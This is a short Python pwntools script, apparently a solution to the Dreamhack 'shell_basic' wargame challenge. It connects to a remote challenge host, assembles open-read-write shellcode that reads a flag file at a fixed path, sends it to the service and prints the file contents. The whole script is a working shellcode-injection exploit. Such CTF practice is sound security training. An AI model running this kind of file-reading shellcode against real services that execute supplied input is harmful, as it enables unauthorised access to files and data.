from pwn import *

p = remote("host3.dreamhack.games",15149)

#architecture info
context.arch = "amd64"
#open file path
path = "/home/shell_basic/flag_name_is_loooooong"

#open result -> rax
shellcode = shellcraft.open(path)
#read(fd,buf,0x30)
shellcode += shellcraft.read('rax','rsp',0x30)
#write(stdout,buf,0x30)
shellcode += shellcraft.write(1,'rsp',0x30)
#Assemble
shellcode = asm(shellcode)

payload = shellcode
#sendafter (shellcode: )
p.sendlineafter("shellcode: ",payload)
#print recive
print(p.recv(0x30))